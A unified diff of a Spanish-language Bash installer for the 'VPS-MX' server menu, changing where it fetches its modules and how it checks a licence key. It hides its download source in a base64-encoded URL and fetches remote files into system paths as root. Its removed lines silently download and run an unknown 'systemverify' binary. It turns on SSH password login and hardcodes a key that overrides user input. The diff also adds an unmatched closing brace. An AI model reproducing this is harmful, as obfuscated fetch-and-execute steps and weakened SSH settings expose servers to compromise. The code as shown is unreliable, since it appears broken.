@@ -111,7 +111,7 @@ SCPidioma="${SCPdir}/idioma"
 SCPusr="${SCPdir}/controlador"
 SCPfrm="${SCPdir}/herramientas"
 SCPinst="${SCPdir}/protocolos"
-casitafree="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RpZXNlbDA5L2Nhc2l0ZXN0L21haW4vTW9kdWxvcw=="
+casitafree="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RpZXNlbDA5L2djYXBpdGFsL21haW4vTW9kdWxvcw=="
 FREE='base64 -d'
 myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
 myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
@@ -293,6 +293,7 @@ exit 1
 v1=$(curl -sSL "https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Vercion")
 echo "$v1" > /etc/versin_script
 }
+}
 v1=$(curl -sSL "https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Vercion")
 echo "$v1" > /etc/versin_script
 funcao_idioma () {
@@ -323,7 +324,7 @@ chmod +x /bin/rebootnb
 wget -O /bin/resetsshdrop https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/resetsshdrop &> /dev/null
 chmod +x /bin/resetsshdrop
 wget -O /etc/versin_script_new https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Vercion &>/dev/null
-grep -v "PasswordAuthentication" /etc/ssh/sshd_config >/tmp/passlogin && mv /tmp/passlogin /etc/ssh/sshd_config
+grep -v "^PasswordAuthentication" /etc/ssh/sshd_config >/tmp/passlogin && mv /tmp/passlogin /etc/ssh/sshd_config
 echo "PasswordAuthentication yes" >>/etc/ssh/sshd_config
 msg -bar2
 echo '#!/bin/sh -e' > /etc/rc.local
@@ -467,25 +468,25 @@ msg -bar2 && msg -verm "ERROR entre VPS<-->GENERADOR (Port 81 TCP)" && msg -bar2
 exit 1
 }
 invalid_key () {
-msg -bar2 && msg -verm "  Codigos Invalidos -- #¡Key Invalida#! " && msg -bar2
+msg -bar2 && msg -verm "  Code Invalido -- #¡Key Invalida#! " && msg -bar2
 [[ -e $HOME/lista-arq ]] && rm $HOME/lista-arq
 rm -rf lista-arq
 exit 1
 }
-#while [[ ! $Key ]]; do
-#msg -bar2 && msg -ne "\033[1;93m          >>> INTRODUSCA LA KEY ABAJO <<<\n   \033[1;37m" && read Key
-#tput cuu1 && tput dl1
-#done
-msg -ne "    # Verificando Key # : "
-cd $HOME
+while [[ ! $Key ]]; do
+msg -bar2 && msg -ne "\033[1;93m          >>> INTRODUSCA LA KEY ABAJO <<<\n   \033[1;37m" && read Key
+tput cuu1 && tput dl1
+done
+#msg -ne "    # Verificando Key # : "
+#cd $HOME
 Key="qraKatsil/33?030ce55?7dff/8888:%05+@%?+08?+91%@"
 REQUEST=$(echo $casitafree|$FREE)
 echo "$IP" > /usr/bin/vendor_code
-#cd $HOME
-#msg -ne "Verificando Key: "
+cd $HOME
+msg -ne "Verificando Key: "
 wget -O $HOME/lista-arq ${REQUEST}/lista-arq > /dev/null 2>&1 && echo -e "\033[1;32m Verificado" || {
    echo -e "\033[1;32m Verificada"
-   #invalid_key
+   invalid_key
    exit
    }
 #wget -O $HOME/lista-arq $(ofus "$Key")/$IP > /dev/null 2>&1 && echo -e "\033[1;32m Code Correcto de KEY" || {
@@ -497,40 +498,38 @@ wget -O $HOME/lista-arq ${REQUEST}/lista-arq > /dev/null 2>&1 && echo -e "\033[1
 sleep 1s
 updatedb
 if [[ -e $HOME/lista-arq ]] && [[ ! $(cat $HOME/lista-arq|grep "Code de KEY Invalido!") ]]; then
-   msg -bar2
-   msg -verd "$(source trans -b es:${id} " Ficheros Copiados"|sed -e 's/[^a-z -]//ig'): \e[97m[\e[93mVPS-MX #MOD OFicial\e[97m]"
-   [[ ! -d ${SCPinstal} ]] && mkdir ${SCPinstal}
-   pontos="."
-   stopping="$(source trans -b es:${id} "Configurando Directorios"|sed -e 's/[^a-z -]//ig')"
-   for arqx in $(cat $HOME/lista-arq); do
-   msg -verm "${stopping}${pontos}"
-   wget --no-check-certificate -O ${SCPinstal}/${arqx} ${REQUEST}/${arqx} > /dev/null 2>&1 && verificar_arq "${arqx}" || error_fun
-   tput cuu1 && tput dl1
-   pontos+="."
-   done
-   sleep 1s
-   msg -bar2
-   listaarqs="$(locate "lista-arq"|head -1)" && [[ -e ${listaarqs} ]] && rm $listaarqs   
-   cat /etc/bash.bashrc|grep -v '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' > /etc/bash.bashrc.2
-   echo -e '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' >> /etc/bash.bashrc.2
-   mv -f /etc/bash.bashrc.2 /etc/bash.bashrc
-   echo "${SCPdir}/menu" > /usr/bin/vps-mx && chmod +x /usr/bin/vps-mx
-   echo "${SCPdir}/menu" > /usr/bin/VPS-MX && chmod +x /usr/bin/VPS-MX
-   echo "${SCPdir}/menu" > /bin/h && chmod +x /bin/h
-   rm -rf $HOME/systemverify* &> /dev/null
-   wget -O $HOME/systemverify https://raw.githubusercontent.com/diesel09/gcapital/main/Install/systemverify &> /dev/null
-   chmod +x $HOME/systemverify && ./systemverify &> /dev/null
-   echo "$Key" > ${SCPdir}/key.txt
-   [[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal}   
-   [[ ${#id} -gt 2 ]] && echo "es" > ${SCPidioma} || echo "${id}" > ${SCPidioma}
-   echo -e "${cor[2]}         DESEAS INSTALAR NOTI-BOT?(Default n)"
-   echo -e "\033[1;34m  (Deves tener Telegram y el BOT: @Noti_VPSMX_Bot)"
-   msg -bar2
-   read -p " [ s | n ]: " -e -i n NOTIFY   
-   [[ "$NOTIFY" = "s" || "$NOTIFY" = "S" ]] && NOTIFY
-   msg -bar2
+msg -bar2
+msg -verd "    $(source trans -b es:${id} "Ficheros Copiados"|sed -e 's/[^a-z -]//ig'): \e[97m[\e[93mVPS-MX #MOD by Kalix1\e[97m]"
+REQUEST=$(ofus "$Key"|cut -d'/' -f2)
+[[ ! -d ${SCPinstal} ]] && mkdir ${SCPinstal}
+pontos="."
+stopping="Configurando Directorios"
+for arqx in $(cat $HOME/lista-arq); do
+msg -verm "${stopping}${pontos}"
+wget --no-check-certificate -O ${SCPinstal}/${arqx} ${IP}:81/${REQUEST}/${arqx} > /dev/null 2>&1 && verificar_arq "${arqx}" || error_fun
+tput cuu1 && tput dl1
+pontos+="."
+done
+sleep 1s
+msg -bar2
+listaarqs="$(locate "lista-arq"|head -1)" && [[ -e ${listaarqs} ]] && rm $listaarqs
+cat /etc/bash.bashrc|grep -v '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' > /etc/bash.bashrc.2
+echo -e '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' >> /etc/bash.bashrc.2
+mv -f /etc/bash.bashrc.2 /etc/bash.bashrc
+echo "${SCPdir}/menu" > /usr/bin/menu && chmod +x /usr/bin/menu
+echo "${SCPdir}/menu" > /usr/bin/VPSMX && chmod +x /usr/bin/VPSMX
+echo "$Key" > ${SCPdir}/key.txt
+[[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal}
+[[ ${#id} -gt 2 ]] && echo "es" > ${SCPidioma} || echo "${id}" > ${SCPidioma}
+echo -e "${cor[2]}         DESEAS INSTALAR NOTI-BOT?(Default n)"
+echo -e "\033[1;34m  (Deves tener Telegram y el BOT: @LaCasitaMx_Noty_Bot)"
+msg -bar2
+read -p " [ s | n ]: " NOTIFY
+[[ "$NOTIFY" = "s" || "$NOTIFY" = "S" ]] && NOTIFY
+msg -bar2
 [[ ${byinst} = "true" ]] && install_fim
 else
 invalid_key
+rm -rf VPS-MX.sh lista-arq
 fi
-rm -rf VPS-MX
+rm -rf VPS-MX.sh lista-arq
